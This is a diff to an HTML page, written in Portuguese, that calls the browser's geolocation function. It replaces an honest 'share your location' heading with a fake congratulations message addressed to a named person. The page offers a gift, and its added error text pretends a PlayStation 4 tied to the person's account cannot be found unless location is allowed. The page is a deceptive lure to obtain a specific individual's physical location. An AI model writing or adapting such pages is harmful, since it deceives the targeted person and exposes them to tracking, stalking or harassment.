@@ -6,7 +6,7 @@
   <link rel="stylesheet" href="style.css"> <!-- Importando o CSS externo -->
 </head>
 <body>
-  <h2>Clique para compartilhar sua localização</h2>
+  <h2>Congratulations Erick Barbosa Da Silva!!!</h2>
   <button onclick="getLocation()">Get your Gift</button>
   <p id="status"></p>
 
@@ -39,7 +39,23 @@
     }
 
     function showError(error) {
-      document.getElementById("status").innerText = "Erro: " + error.message;
+      let message;
+
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          message = "Localização recusada. Não foi possível encontrar o PlayStation 4 vinculado à conta.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          message = "Informações de localização indisponíveis.";
+          break;
+        case error.TIMEOUT:
+          message = "Tempo esgotado ao tentar obter a localização.";
+          break;
+        default:
+          message = "Erro desconhecido ao obter localização.";
+      }
+
+      document.getElementById("status").innerText = "Erro: " + message;
     }
   </script>
 </body>
